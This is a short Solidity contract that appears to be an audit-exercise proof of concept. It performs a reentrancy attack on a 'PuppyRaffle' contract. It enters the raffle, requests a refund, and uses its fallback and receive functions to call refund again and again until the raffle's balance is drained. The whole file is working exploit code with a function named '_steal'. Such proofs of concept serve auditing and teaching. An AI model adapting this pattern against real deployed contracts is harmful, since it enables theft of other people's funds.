//SPDX-License-Identifier:MIT
pragma solidity ^0.7.0;
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
contract PuppyRaffleReentrancy {
   PuppyRaffle public raffle;
   uint256 receivedether;
   uint256 indexOfPlayer;
    constructor (PuppyRaffle _raffle){
        raffle = _raffle;
    }
    
    function entrypoint() public payable {
        address playerOne = address(1);
        address[] memory attacker = new address[](1);
        attacker[0] = address(this);
        raffle.enterRaffle{value: msg.value}(attacker);
        indexOfPlayer = raffle.getActivePlayerIndex(address(this));  
        raffle.refund(indexOfPlayer);
    }
 
      function _steal() internal {
        if(address(raffle).balance > 0){
            raffle.refund(indexOfPlayer);
            }
         }
         fallback() external payable {
            _steal();
           }
     
    receive() external payable {
       _steal();
      }

}